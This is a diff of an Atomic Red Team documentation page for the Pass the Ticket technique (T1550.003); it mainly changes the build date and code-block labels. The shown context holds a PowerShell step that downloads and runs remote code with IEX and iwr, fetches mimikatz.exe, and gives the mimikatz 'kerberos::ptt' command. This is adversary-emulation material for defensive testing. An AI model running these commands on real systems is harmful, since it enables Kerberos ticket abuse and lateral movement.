@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1550.003"
 attack_technique_name: "Use Alternate Authentication Material: Pass the Ticket"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "dbf38128-7ba7-4776-bedf-cc2eed432098"
@@ -56,13 +56,13 @@ Mimikatz must exist on disk at specified location (#{mimikatz_exe})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
@@ -78,7 +78,7 @@ Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
 
 ### Command
 
-```commandprompt
+```cmd
 "#{mimikatz_exe}" "kerberos::ptt #{ticket}"
 ```
 
